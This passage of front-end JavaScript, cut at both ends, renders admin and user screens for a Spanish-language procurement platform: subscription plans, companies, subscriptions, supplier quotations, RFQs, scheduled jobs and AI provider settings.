                        <div class="plan-price">${p.price_bob > 0 ? p.price_bob.toFixed(0) + ' <span>BOB/mes</span>' : 'Gratis'}</div>
                        <div style="font-size:13px;color:var(--gray-600);margin-bottom:8px">
                            ${p.max_users} usuario${p.max_users > 1 ? 's' : ''} &middot;
                            ${p.max_pedidos_month >= 999 ? 'Pedidos ilimitados' : p.max_pedidos_month + ' pedidos/mes'}
                        </div>
                        <ul class="plan-features">
                            ${(p.features || []).map(f => `<li>${esc(f)}</li>`).join('')}
                        </ul>
                        ${!p.is_active ? '<p style="color:#dc2626;font-size:12px;margin-top:6px;font-weight:600">INACTIVO</p>' : ''}
                        <div style="display:flex;gap:6px;margin-top:10px">
                            <button class="btn btn-sm btn-secondary" onclick="showPlanFormModal(${p.id})">Editar</button>
                            <button class="btn btn-sm btn-danger" onclick="deletePlan(${p.id},'${escJs(p.key)}')">Eliminar</button>
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    } catch { c.innerHTML = '<p>Error de conexion</p>'; }
}

async function showPlanFormModal(planId) {
    let plan = null;
    if (planId) {
        const resp = await API.adminPlans();
        if (resp.ok) plan = resp.data.find(p => p.id === planId);
    }
    const isEdit = !!plan;
    const title = isEdit ? 'Editar Plan' : 'Nuevo Plan';

    showModal(title, `
        <form onsubmit="handlePlanForm(event, ${planId || 'null'})">
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">Key (slug) *</label>
                    <input class="form-input" name="key" required value="${plan ? esc(plan.key) : ''}" ${isEdit ? 'readonly style="background:var(--gray-100)"' : ''} placeholder="ej: premium">
                </div>
                <div class="form-group">
                    <label class="form-label">Nombre *</label>
                    <input class="form-input" name="label" required value="${plan ? esc(plan.label) : ''}" placeholder="ej: Premium">
                </div>
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">Max usuarios</label>
                    <input class="form-input" name="max_users" type="number" min="1" value="${plan ? plan.max_users : 1}">
                </div>
                <div class="form-group">
                    <label class="form-label">Max pedidos/mes</label>
                    <input class="form-input" name="max_pedidos_month" type="number" min="1" value="${plan ? plan.max_pedidos_month : 5}">
                </div>
                <div class="form-group">
                    <label class="form-label">Precio BOB</label>
                    <input class="form-input" name="price_bob" type="number" step="0.01" min="0" value="${plan ? plan.price_bob : 0}">
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Orden</label>
                <input class="form-input" name="sort_order" type="number" min="0" value="${plan ? plan.sort_order : 0}">
            </div>
            <div class="form-group">
                <label class="form-label">Features (una por linea)</label>
                <textarea class="form-input" name="features" rows="4" placeholder="Feature 1&#10;Feature 2&#10;...">${plan ? (plan.features || []).join('\n') : ''}</textarea>
            </div>
            ${isEdit ? `
                <div class="form-group">
                    <label style="display:flex;align-items:center;gap:8px;font-size:13px">
                        <input type="checkbox" name="is_active" ${plan.is_active ? 'checked' : ''}>
                        Plan activo
                    </label>
                </div>
            ` : ''}
            <div style="text-align:right;margin-top:12px">
                <button type="button" class="btn btn-secondary" onclick="closeModal()" style="margin-right:8px">Cancelar</button>
                <button type="submit" class="btn btn-primary">${isEdit ? 'Guardar' : 'Crear Plan'}</button>
            </div>
        </form>
    `);
}

async function handlePlanForm(e, planId) {
    e.preventDefault();
    const f = e.target;
    const features = f.features.value.split('\n').map(s => s.trim()).filter(Boolean);
    const data = {
        label: f.label.value,
        max_users: parseInt(f.max_users.value) || 1,
        max_pedidos_month: parseInt(f.max_pedidos_month.value) || 5,
        price_bob: parseFloat(f.price_bob.value) || 0,
        sort_order: parseInt(f.sort_order.value) || 0,
        features,
    };

    let resp;
    if (planId) {
        data.is_active = f.is_active?.checked ?? true;
        resp = await API.adminUpdatePlan(planId, data);
    } else {
        data.key = f.key.value;
        resp = await API.adminCreatePlan(data);
    }
    if (resp.ok) {
        closeModal();
        toast(planId ? 'Plan actualizado' : 'Plan creado', 'success');
        renderAdminPlans();
    } else toast(resp.detail || 'Error', 'error');
}

async function deletePlan(planId, key) {
    if (!confirm(`Eliminar el plan "${key}"? Solo es posible si ninguna suscripcion lo usa.`)) return;
    const resp = await API.adminDeletePlan(planId);
    if (resp.ok) {
        toast('Plan eliminado', 'success');
        renderAdminPlans();
    } else toast(resp.detail || 'Error', 'error');
}

// ── Admin: Companies ──────────────────────────────────────────
async function renderAdminCompanies() {
    if (!isAdmin()) { toast('Sin permisos', 'error'); return; }
    const c = document.getElementById('admin-content');
    c.innerHTML = '<div class="empty-state"><p>Cargando empresas...</p></div>';

    try {
        const resp = await API.adminCompanies();
        if (!resp.ok) { c.innerHTML = '<p>Error cargando datos</p>'; return; }
        if (!resp.data.length) { c.innerHTML = '<div class="empty-state"><p>No hay empresas registradas</p></div>'; return; }

        const planColors = { free: '#6b7280', professional: '#2563eb', enterprise: '#d97706' };
        c.innerHTML = `
            <p style="margin-bottom:12px;font-size:13px;color:var(--gray-500)">${resp.total} empresas registradas</p>
            <div class="table-wrapper"><table class="table">
                <thead><tr>
                    <th>Empresa</th><th>NIT</th><th>Ciudad</th><th>Plan</th><th>Miembros</th><th>Creado</th>
                </tr></thead>
                <tbody>
                    ${resp.data.map(co => `<tr>
                        <td><strong>${esc(co.name)}</strong></td>
                        <td>${esc(co.nit || '-')}</td>
                        <td>${co.city ? esc(co.city) : '-'}</td>
                        <td>${co.plan ? `<span class="pedido-state" style="background:${planColors[co.plan]||'#6b7280'}">${esc(co.plan)}</span>` : '-'}</td>
                        <td>${co.member_count || 0}</td>
                        <td>${new Date(co.created_at).toLocaleDateString()}</td>
                    </tr>`).join('')}
                </tbody>
            </table></div>
        `;
    } catch { c.innerHTML = '<p>Error de conexion</p>'; }
}

// ── Admin: Subscriptions ─────────────────────────────────────
async function renderAdminSubscriptions() {
    if (!isAdmin()) { toast('Sin permisos', 'error'); return; }
    const c = document.getElementById('admin-content');
    c.innerHTML = '<div class="empty-state"><p>Cargando suscripciones...</p></div>';

    try {
        const resp = await API.adminSubscriptions();
        if (!resp.ok) { c.innerHTML = '<p>Error cargando datos</p>'; return; }
        if (!resp.data.length) { c.innerHTML = '<div class="empty-state"><p>No hay suscripciones</p></div>'; return; }

        const stateColors = { active: '#16a34a', expired: '#dc2626', cancelled: '#6b7280', suspended: '#d97706' };
        c.innerHTML = `
            <p style="margin-bottom:12px;font-size:13px;color:var(--gray-500)">${resp.total} suscripciones</p>
            <div class="table-wrapper"><table class="table">
                <thead><tr>
                    <th>Empresa</th><th>Plan</th><th>Estado</th><th>Usuarios</th><th>Pedidos/mes</th><th>Vence</th><th>Ultimo pago</th><th></th>
                </tr></thead>
                <tbody>
                    ${resp.data.map(s => `<tr>
                        <td><strong>${esc(s.company_name || '#' + s.company_id)}</strong></td>
                        <td>${esc(s.plan)}</td>
                        <td><span style="color:${stateColors[s.state]||'#6b7280'};font-weight:600">${esc(s.state)}</span></td>
                        <td>${s.max_users}</td>
                        <td>${s.max_pedidos_month === 999 ? '∞' : s.max_pedidos_month}</td>
                        <td>${s.expires_at ? new Date(s.expires_at).toLocaleDateString() : 'Sin limite'}</td>
                        <td>${s.last_payment_date ? new Date(s.last_payment_date).toLocaleDateString() + (s.last_payment_amount ? ' - ' + s.last_payment_amount.toFixed(2) + ' BOB' : '') : '-'}</td>
                        <td><button class="btn btn-sm btn-secondary" onclick="showEditSubscriptionModal(${s.id},'${escJs(s.plan)}','${escJs(s.state)}',${s.max_users},${s.max_pedidos_month})">Editar</button></td>
                    </tr>`).join('')}
                </tbody>
            </table></div>
            ${resp.data.some(s => s.notes && s.notes.includes('UPGRADE')) ? '<p style="margin-top:12px;padding:10px;background:#fef3c7;border-radius:8px;font-size:13px">⚠ Hay solicitudes de upgrade pendientes (ver campo Notas)</p>' : ''}
        `;
    } catch { c.innerHTML = '<p>Error de conexion</p>'; }
}

async function showEditSubscriptionModal(subId, currentPlan, currentState, maxUsers, maxPedidos) {
    // Load plan keys dynamically from DB
    let planKeys = ['free', 'professional', 'enterprise'];
    try {
        const pr = await API.adminPlans();
        if (pr.ok && pr.data.length) planKeys = pr.data.map(p => p.key);
    } catch {}
    const planOpts = planKeys.map(p =>
        `<option value="${p}" ${p === currentPlan ? 'selected' : ''}>${p}</option>`
    ).join('');
    const stateOpts = ['active', 'expired', 'cancelled', 'suspended'].map(s =>
        `<option value="${s}" ${s === currentState ? 'selected' : ''}>${s}</option>`
    ).join('');

    showModal('Editar Suscripcion #' + subId, `
        <form onsubmit="handleEditSubscription(event, ${subId})">
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">Plan</label>
                    <select class="form-input" name="plan">${planOpts}</select>
                </div>
                <div class="form-group">
                    <label class="form-label">Estado</label>
                    <select class="form-input" name="state">${stateOpts}</select>
                </div>
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">Max usuarios</label>
                    <input class="form-input" name="max_users" type="number" min="1" value="${maxUsers}">
                </div>
                <div class="form-group">
                    <label class="form-label">Max pedidos/mes</label>
                    <input class="form-input" name="max_pedidos_month" type="number" min="1" value="${maxPedidos}">
                </div>
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">Metodo pago</label>
                    <select class="form-input" name="payment_method">
                        <option value="">N/A</option>
                        <option value="transfer">Transferencia</option>
                        <option value="qr_bo">QR Bolivia</option>
                        <option value="manual">Manual</option>
                    </select>
                </div>
                <div class="form-group">
                    <label class="form-label">Monto pago (BOB)</label>
                    <input class="form-input" name="last_payment_amount" type="number" step="0.01" min="0">
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Fecha expiracion (ISO)</label>
                <input class="form-input" name="expires_at" type="datetime-local">
            </div>
            <div class="form-group">
                <label class="form-label">Notas</label>
                <textarea class="form-input" name="notes" rows="2"></textarea>
            </div>
            <div style="text-align:right;margin-top:12px">
                <button type="button" class="btn btn-secondary" onclick="closeModal()" style="margin-right:8px">Cancelar</button>
                <button type="submit" class="btn btn-primary">Guardar</button>
            </div>
        </form>
    `);
}

async function handleEditSubscription(e, subId) {
    e.preventDefault();
    const f = e.target;
    const data = {};
    if (f.plan.value) data.plan = f.plan.value;
    if (f.state.value) data.state = f.state.value;
    if (f.max_users.value) data.max_users = parseInt(f.max_users.value);
    if (f.max_pedidos_month.value) data.max_pedidos_month = parseInt(f.max_pedidos_month.value);
    if (f.payment_method.value) data.payment_method = f.payment_method.value;
    if (f.last_payment_amount.value) data.last_payment_amount = parseFloat(f.last_payment_amount.value);
    if (f.expires_at.value) data.expires_at = new Date(f.expires_at.value).toISOString();
    if (f.notes.value) data.notes = f.notes.value;

    const resp = await API.adminUpdateSubscription(subId, data);
    if (resp.ok) {
        closeModal();
        toast('Suscripcion actualizada', 'success');
        renderAdminSubscriptions();
    } else toast(resp.detail || 'Error', 'error');
}

// ── Render: Quotations (auth) ──────────────────────────────────
async function renderQuotations() {
    if (!state.user) { showLoginModal(); navigate('home'); return; }

    const page = document.getElementById('page-content');
    page.innerHTML = `
        <div class="page-header">
            <h1 class="page-title">Cotizaciones</h1>
        </div>
        <div style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap">
            <button class="btn btn-primary" onclick="showUploadQuotationModal()">${icon('upload',16)} Subir Archivo</button>
            <button class="btn btn-secondary" onclick="showManualQuotationModal()">${icon('plus',16)} Manual</button>
        </div>
        <div id="quotations-list"></div>
    `;
    await loadQuotations();
}

async function loadQuotations() {
    try {
        const resp = await API.quotations();
        if (resp.ok) {
            const container = document.getElementById('quotations-list');
            if (!resp.data.length) {
                container.innerHTML = '<div class="empty-state"><p>No hay cotizaciones</p></div>';
                return;
            }
            container.innerHTML = `<div class="table-wrap"><table>
                <thead><tr><th>Ref.</th><th>Origen</th><th>Estado</th><th>Lineas</th><th>Matched</th><th>Fecha</th></tr></thead>
                <tbody>${resp.data.map(q => `
                    <tr>
                        <td><strong>${esc(q.reference)}</strong></td>
                        <td><span class="badge badge-gray">${esc(q.source)}</span></td>
                        <td><span class="badge badge-${q.state === 'matched' || q.state === 'validated' ? 'success' : q.state === 'processing' ? 'warning' : 'primary'}">${esc(q.state)}</span></td>
                        <td>${q.line_count}</td>
                        <td>${q.matched_count}</td>
                        <td>${q.received_at ? new Date(q.received_at).toLocaleDateString('es') : '-'}</td>
                    </tr>
                `).join('')}</tbody>
            </table></div>`;
        }
    } catch { toast('Error cargando cotizaciones', 'error'); }
}

function showUploadQuotationModal() {
    showModal('Subir Cotizacion', `
        <form id="upload-quot-form" onsubmit="handleUploadQuotation(event)">
            <div class="form-group"><label class="form-label">Proveedor ID</label><input class="form-input" type="number" name="supplier_id" required></div>
            <div class="form-group"><label class="form-label">Archivo (Excel, PDF o Foto)</label>
                <input class="form-input" type="file" name="file" accept=".xlsx,.xls,.pdf,image/*" required>
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group"><label class="form-label">Region</label><input class="form-input" name="region" placeholder="Ej: Santa Cruz"></div>
                <div class="form-group"><label class="form-label">Moneda</label>
                    <select class="form-select" name="currency"><option value="BOB">BOB</option><option value="USD">USD</option></select>
                </div>
            </div>
            <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center">Subir y Procesar</button>
        </form>
    `);
}

async function handleUploadQuotation(e) {
    e.preventDefault();
    const f = e.target;
    const fd = new FormData();
    fd.append('supplier_id', f.supplier_id.value);
    fd.append('file', f.file.files[0]);
    fd.append('region', f.region.value);
    fd.append('currency', f.currency.value);
    const resp = await API.uploadQuotation(fd);
    if (resp.ok) { closeModal(); toast(`Cotizacion creada: ${resp.extracted_lines} lineas`, 'success'); loadQuotations(); }
    else toast(resp.detail || 'Error al procesar archivo', 'error');
}

function showManualQuotationModal() {
    showModal('Cotizacion Manual', `
        <form id="manual-quot-form" onsubmit="handleManualQuotation(event)">
            <div class="form-group"><label class="form-label">Proveedor ID</label><input class="form-input" type="number" name="supplier_id" required></div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group"><label class="form-label">Region</label><input class="form-input" name="region"></div>
                <div class="form-group"><label class="form-label">Moneda</label>
                    <select class="form-select" name="currency"><option value="BOB">BOB</option><option value="USD">USD</option></select>
                </div>
            </div>
            <div id="manual-lines"><h3 style="font-size:14px;margin-bottom:8px">Lineas</h3>
                <div style="display:grid;grid-template-columns:2fr 1fr 1fr;gap:8px;margin-bottom:8px">
                    <input class="form-input" name="line_name_0" placeholder="Producto" required>
                    <input class="form-input" name="line_uom_0" placeholder="UOM">
                    <input class="form-input" type="number" step="0.01" name="line_price_0" placeholder="Precio" required>
                </div>
            </div>
            <button type="button" class="btn btn-secondary btn-sm" onclick="addManualLine()" style="margin-bottom:16px">+ Agregar linea</button>
            <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center">Crear Cotizacion</button>
        </form>
    `);
}

let _manualLineCount = 1;
function addManualLine() {
    const i = _manualLineCount++;
    const container = document.getElementById('manual-lines');
    const div = document.createElement('div');
    div.style = 'display:grid;grid-template-columns:2fr 1fr 1fr;gap:8px;margin-bottom:8px';
    div.innerHTML = `
        <input class="form-input" name="line_name_${i}" placeholder="Producto" required>
        <input class="form-input" name="line_uom_${i}" placeholder="UOM">
        <input class="form-input" type="number" step="0.01" name="line_price_${i}" placeholder="Precio" required>
    `;
    container.appendChild(div);
}

async function handleManualQuotation(e) {
    e.preventDefault();
    const f = e.target;
    const lines = [];
    for (let i = 0; i < 100; i++) {
        const name = f[`line_name_${i}`]?.value;
        if (!name) break;
        lines.push({
            product_name: name,
            uom: f[`line_uom_${i}`]?.value || null,
            unit_price: parseFloat(f[`line_price_${i}`]?.value || 0),
        });
    }
    const resp = await API.createQuotation({
        supplier_id: parseInt(f.supplier_id.value),
        region: f.region.value || null,
        currency: f.currency.value,
        lines,
    });
    if (resp.ok) { closeModal(); toast('Cotizacion creada', 'success'); loadQuotations(); }
    else toast(resp.detail || 'Error', 'error');
}

// ── Render: RFQ (auth) ─────────────────────────────────────────
async function renderRFQ() {
    if (!state.user) { showLoginModal(); navigate('home'); return; }

    const page = document.getElementById('page-content');
    page.innerHTML = `
        <div class="page-header">
            <h1 class="page-title">Solicitudes de Cotizacion</h1>
        </div>
        <button class="btn btn-primary" onclick="showNewRFQModal()" style="margin-bottom:16px">${icon('plus',16)} Nueva RFQ</button>
        <div id="rfq-list"></div>
    `;
    await loadRFQs();
}

async function loadRFQs() {
    try {
        const resp = await API.rfqs();
        if (resp.ok) {
            const container = document.getElementById('rfq-list');
            if (!resp.data.length) {
                container.innerHTML = '<div class="empty-state"><p>No hay solicitudes de cotizacion</p></div>';
                return;
            }
            container.innerHTML = `<div class="table-wrap"><table>
                <thead><tr><th>Ref.</th><th>Titulo</th><th>Estado</th><th>Proveedores</th><th>Respuestas</th></tr></thead>
                <tbody>${resp.data.map(r => `
                    <tr>
                        <td><strong>${esc(r.reference)}</strong></td>
                        <td>${esc(r.title)}</td>
                        <td><span class="badge badge-${r.state === 'sent' ? 'success' : r.state === 'closed' ? 'gray' : 'primary'}">${esc(r.state)}</span></td>
                        <td>${r.supplier_count}</td>
                        <td>${r.response_count}</td>
                    </tr>
                `).join('')}</tbody>
            </table></div>`;
        }
    } catch { toast('Error cargando RFQs', 'error'); }
}

function showNewRFQModal() {
    showModal('Nueva Solicitud de Cotizacion', `
        <form id="new-rfq-form" onsubmit="handleCreateRFQ(event)">
            <div class="form-group"><label class="form-label">Titulo</label><input class="form-input" name="title" required placeholder="Ej: Materiales para obra X"></div>
            <div class="form-group"><label class="form-label">Descripcion</label><textarea class="form-input" name="description"></textarea></div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group"><label class="form-label">Region</label><input class="form-input" name="region" placeholder="Santa Cruz"></div>
                <div class="form-group"><label class="form-label">Fecha limite</label><input class="form-input" type="date" name="deadline"></div>
            </div>
            <div class="form-group"><label class="form-label">IDs de proveedores (separados por coma)</label><input class="form-input" name="supplier_ids" required placeholder="1,2,3"></div>
            <div class="form-group"><label class="form-label">Canales de envio</label>
                <div style="display:flex;gap:12px">
                    <label><input type="checkbox" name="ch_email" checked> Email</label>
                    <label><input type="checkbox" name="ch_whatsapp"> WhatsApp</label>
                    <label><input type="checkbox" name="ch_telegram"> Telegram</label>
                </div>
            </div>
            <div id="rfq-items"><h3 style="font-size:14px;margin:12px 0 8px">Items</h3>
                <div style="display:grid;grid-template-columns:2fr 1fr 1fr;gap:8px;margin-bottom:8px">
                    <input class="form-input" name="item_name_0" placeholder="Nombre" required>
                    <input class="form-input" name="item_uom_0" placeholder="UOM">
                    <input class="form-input" type="number" step="0.01" name="item_qty_0" placeholder="Cant." value="1">
                </div>
            </div>
            <button type="button" class="btn btn-secondary btn-sm" onclick="addRFQItem()" style="margin-bottom:16px">+ Agregar item</button>
            <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center">Crear RFQ</button>
        </form>
    `);
}

let _rfqItemCount = 1;
function addRFQItem() {
    const i = _rfqItemCount++;
    const container = document.getElementById('rfq-items');
    const div = document.createElement('div');
    div.style = 'display:grid;grid-template-columns:2fr 1fr 1fr;gap:8px;margin-bottom:8px';
    div.innerHTML = `
        <input class="form-input" name="item_name_${i}" placeholder="Nombre" required>
        <input class="form-input" name="item_uom_${i}" placeholder="UOM">
        <input class="form-input" type="number" step="0.01" name="item_qty_${i}" placeholder="Cant." value="1">
    `;
    container.appendChild(div);
}

async function handleCreateRFQ(e) {
    e.preventDefault();
    const f = e.target;
    const items = [];
    for (let i = 0; i < 100; i++) {
        const name = f[`item_name_${i}`]?.value;
        if (!name) break;
        items.push({
            name, uom: f[`item_uom_${i}`]?.value || null,
            quantity: parseFloat(f[`item_qty_${i}`]?.value || 1),
        });
    }
    const channels = [];
    if (f.ch_email.checked) channels.push('email');
    if (f.ch_whatsapp.checked) channels.push('whatsapp');
    if (f.ch_telegram.checked) channels.push('telegram');

    const resp = await API.createRFQ({
        title: f.title.value,
        description: f.description.value || null,
        region: f.region.value || null,
        deadline: f.deadline.value || null,
        supplier_ids: f.supplier_ids.value.split(',').map(s => parseInt(s.trim())).filter(Boolean),
        channels, items,
    });
    if (resp.ok) { closeModal(); toast('RFQ creada', 'success'); loadRFQs(); }
    else toast(resp.detail || 'Error', 'error');
}

// ── Admin: Tasks (Cron Jobs) ──────────────────────────────────
async function renderAdminTasks() {
    const c = document.getElementById('admin-content');
    c.innerHTML = '<div class="loading">Cargando tareas...</div>';

    const [jobsResp, logsResp] = await Promise.all([
        API.adminJobs(),
        API.adminTaskLogs('', 0, 30),
    ]);
    const jobs = jobsResp.ok ? jobsResp.data : [];
    const logs = logsResp.ok ? logsResp.data : [];

    const jobCards = jobs.map(j => `
        <div class="task-card">
            <div class="task-card-header">
                <div>
                    <h3 class="task-card-title">${icon('clock', 16)} ${esc(j.label)}</h3>
                    <span class="task-card-cron">${esc(j.cron)}</span>
                </div>
                <button class="btn btn-sm btn-primary" onclick="runJobNow('${escJs(j.name)}')" id="run-btn-${j.name}">
                    ${icon('trending-up', 14)} Ejecutar Ahora
                </button>
            </div>
            <p class="task-card-desc">${esc(j.description)}</p>
            ${j.next_run ? `<div class="task-card-next">Proxima ejecucion: ${new Date(j.next_run).toLocaleString()}</div>` : ''}
        </div>
    `).join('');

    const logRows = logs.length ? logs.map(l => {
        const stateClass = l.state === 'success' ? 'state-success' : l.state === 'error' ? 'state-error' : 'state-running';
        const stateLabel = l.state === 'success' ? 'OK' : l.state === 'error' ? 'Error' : 'Ejecutando...';
        return `
            <tr class="${stateClass}">
                <td>${esc(l.job_name)}</td>
                <td><span class="task-state-badge ${stateClass}">${stateLabel}</span></td>
                <td>${l.started_at ? new Date(l.started_at).toLocaleString() : '-'}</td>
                <td>${l.duration_s != null ? l.duration_s.toFixed(1) + 's' : '-'}</td>
                <td class="task-log-result">${l.error ? `<span style="color:#ef4444" title="${esc(l.error)}">${esc(l.error.substring(0, 80))}...</span>` : esc(l.result_summary || '-')}</td>
            </tr>`;
    }).join('') : '<tr><td colspan="5" style="text-align:center;color:var(--gray-400)">Sin ejecuciones registradas</td></tr>';

    c.innerHTML = `
        <h2 style="margin-bottom:16px">${icon('clock', 20)} Tareas Programadas</h2>
        <div class="task-cards-grid">${jobCards}</div>
        <h3 style="margin:24px 0 12px">${icon('file-text', 18)} Historial de Ejecuciones</h3>
        <div style="overflow-x:auto">
            <table class="admin-table">
                <thead><tr>
                    <th>Tarea</th><th>Estado</th><th>Inicio</th><th>Duracion</th><th>Resultado</th>
                </tr></thead>
                <tbody>${logRows}</tbody>
            </table>
        </div>
    `;
}

async function runJobNow(jobName) {
    const btn = document.getElementById('run-btn-' + jobName);
    if (btn) { btn.disabled = true; btn.textContent = 'Ejecutando...'; }

    const resp = await API.adminRunJob(jobName);
    if (resp.ok && resp.data) {
        const d = resp.data;
        if (d.state === 'success') {
            toast(`Tarea completada en ${d.duration_s}s`, 'success');
        } else {
            toast(`Tarea fallo: ${d.error || 'Error desconocido'}`, 'error');
        }
    } else {
        toast(resp.detail || 'Error ejecutando tarea', 'error');
    }

    renderAdminTasks();
}

// ── Admin: AI Config ──────────────────────────────────────────
async function renderAdminAI() {
    const c = document.getElementById('admin-content');
    c.innerHTML = '<div class="loading">Cargando configuracion IA...</div>';

    const resp = await API.adminAIConfig();
    if (!resp.ok) { c.innerHTML = '<p>Error cargando config</p>'; return; }

    const { config, providers } = resp.data;
    const currentProvider = config ? config.provider : '';
    const currentKey = config ? config.api_key : '';
    const currentModel = config ? config.model : '';

    const providerOptions = providers.map(p => `
        <option value="${p.key}" ${p.key === currentProvider ? 'selected' : ''}>
            ${esc(p.label)}${p.free_tier ? ' ★ GRATIS' : ''}
        </option>
    `).join('');

    const providerCards = providers.map(p => `
        <div class="ai-provider-card ${p.key === currentProvider ? 'active' : ''}" onclick="selectAIProvider('${p.key}')">
            <div class="ai-provider-name">${esc(p.label)}</div>
            <div class="ai-provider-hint">${esc(p.help_text)}</div>
            ${p.free_tier ? '<span class="ai-free-badge">Gratis</span>' : ''}
        </div>
    `).join('');

    // Build model options for the provider data attribute
    const providersJson = JSON.stringify(providers.reduce((acc, p) => {
        acc[p.key] = { models: p.models, default_model: p.default_model, help_url: p.help_url };
        return acc;
    }, {}));

    c.innerHTML = `
        <h2 class="adm-title">${icon('globe', 22)} Inteligencia Artificial</h2>

        <!-- What AI does -->
        <div class="ai-features-grid">
            <div class="ai-feat"><span class="ai-feat-ico" style="background:#dbeafe;color:#1e40af">${icon('file-text',18)}</span><div><strong>Extraccion de Documentos</strong><p>Extrae precios y productos de PDFs, fotos y Excel de cotizaciones automaticamente</p></div></div>
            <div class="ai-feat"><span class="ai-feat-ico" style="background:#d1fae5;color:#065f46">${icon('check-circle',18)}</span><div><strong>Curacion de Materiales</strong><p>Detecta duplicados, sugiere agrupaciones y normaliza nombres de productos</p></div></div>
            <div class="ai-feat"><span class="ai-feat-ico" style="background:#fef3c7;color:#92400e">${icon('trending-up',18)}</span><div><strong>Analisis de Precios</strong><p>Valida precios fuera de rango, calcula promedios y detecta anomalias</p></div></div>
        </div>

        <!-- Provider selection -->
        <div class="integ-section">
            <h3 style="margin-bottom:12px">Proveedor de IA</h3>
            <div class="ai-providers-grid">${providerCards}</div>

            <form id="ai-config-form" onsubmit="handleSaveAIConfig(event)" style="margin-top:16px">
                <input type="hidden" id="ai-providers-data" value="${esc(providersJson)}">
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                    <div class="form-group">
                        <label class="form-label">Proveedor</label>
                        <select class="form-input" id="ai-provider-select" name="provider" onchange="onAIProviderChange()" required>
                            <option value="">-- Seleccionar --</option>
                            ${providerOptions}
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Modelo <small style="font-weight:400;color:var(--gray-400)">(elegir o escribir custom)</small></label>
                        <input class="form-input" id="ai-model-input" name="model" list="ai-model-list" value="${esc(currentModel)}" placeholder="Modelo por defecto del proveedor">
                        <datalist id="ai-model-list"></datalist>
                    </div>
                </div>
                <div class="form-group">
                    <label class="form-label">API Key</label>
                    <input class="form-input" name="api_key" type="password" value="${esc(currentKey)}" placeholder="sk-..." required>
                    <a id="ai-help-link" href="#" target="_blank" style="font-size:12px;color:var(--primary);display:${currentProvider ? 'inline' : 'none'}">Obtener API Key</a>
                </div>
                <div style="display:flex;gap:8px">
                    <button type="submit" class="btn btn-primary">${icon('check', 16)} Guardar</button>
                    <button type="button" class="btn btn-secondary" onclick="testAIConfig()">Probar Conexion</button>
                </div>
            </form>
            <div id="ai-test-result" style="margin-top:8px"></div>
            ${config ? `<div style="margin-top:12px;font-size:12px;color:var(--gray-400)">Config actual: ${esc(currentProvider)} / ${esc(currentModel)} / Key: ${currentKey ? '●●●' + currentKey.slice(-4) : 'sin configurar'}</div>` : ''}
        </div>

        <!-- AI Actions -->
        <div class="integ-section">
            <h3 style="margin-bottom:8px">Ejecutar Acciones AI</h3>
            <p style="font-size:13px;color:var(--gray-500);margin-bottom:12px">Estas tareas se ejecutan automaticamente (ver Tareas Auto), pero puedes lanzarlas manualmente.</p>
            <div style="display:flex;gap:8px;flex-wrap:wrap">
                <button class="btn btn-secondary" onclick="runJobNow('material_curation')">${icon('check-circle',16)} Curar Materiales</button>
                <button class="btn btn-secondary" onclick="runJobNow('refresh_prices')">${icon('trending-up',16)} Recalcular Precios</button>
            </div>
            <div id="ai-action-result" style="margin-top:8px"></div>
        </div>
    `;

    // Initialize model dropdown
    if (currentProvider) onAIProviderChange();
}

function selectAIProvider(key) {
    document.getElementById('ai-provider-select').value = key;
    onAIProviderChange();
    // Update active card
    document.querySelectorAll('.ai-provider-card').forEach(c => c.classList.remove('active'));
    const cards = document.querySelectorAll('.ai-provider-card');
    cards.forEach(c => { if (c.onclick.toString().includes(key)) c.classList.add('active'); });
}

function onAIProviderChange() {
    const sel = document.getElementById('ai-provider-select');
    const provider = sel.value;
    const dataEl = document.getElementById('ai-providers-data');
    if (!dataEl || !provider) return;

    let providers;
    try { providers = JSON.parse(dataEl.value); } catch { return; }
    const info = providers[provider];
    if (!info) return;

    // Update models datalist (suggestions, user can still type custom)
    const modelInput = document.getElementById('ai-model-input');
    const datalist = document.getElementById('ai-model-list');
    if (datalist) {
        datalist.innerHTML = info.models.map(m =>
            `<option value="${m}">${m}${m === info.default_model ? ' (default)' : ''}</option>`
        ).join('');
    }
    // Set default model if input is empty
    if (modelInput && !modelInput.value) {
        modelInput.placeholder = info.default_model;
    }

    // Update help link
    const helpLink = document.getElementById('ai-help-link');
    if (helpLink) {
        helpLink.href = info.help_url;
        helpLink.style.display = 'inline';
    }

    // Update active card visual
    document.querySelectorAll('.ai-provider-card').forEach(c => c.classList.remove('active'));
    document.querySelectorAll('.ai-provider-card').forEach(c => {
        if (c.querySelector('.ai-provider-name')?.textContent.includes(sel.options[sel.selectedIndex]?.text?.split('★')[0]?.trim())) {
            c.classList.add('active');
        }
    });
}

async function handleSaveAIConfig(e) {
    e.preventDefault();
    const f = e.target;
    const resp = await API.adminUpdateAIConfig({
        provider: f.provider.value,
        api_key: f.api_key.value,
        model: f.model.value.trim(),
    });
    if (resp.ok) {
        toast('Configuracion de IA guardada', 'success');
        renderAdminAI();
    } else {
        toast(resp.detail || 'Error guardando', 'error');
    }
}

async function testAIConfig() {
    const resultEl = document.getElementById('ai-test-result');
    resultEl.innerHTML = '<div class="loading" style="padding:8px">Probando conexion...</div>';

    const resp = await API.adminTestAI();
    if (resp.ok) {
        resultEl.innerHTML = `<div style="background:#dcfce7;color:#166534;padding:10px;border-radius:8px;font-size:13px">
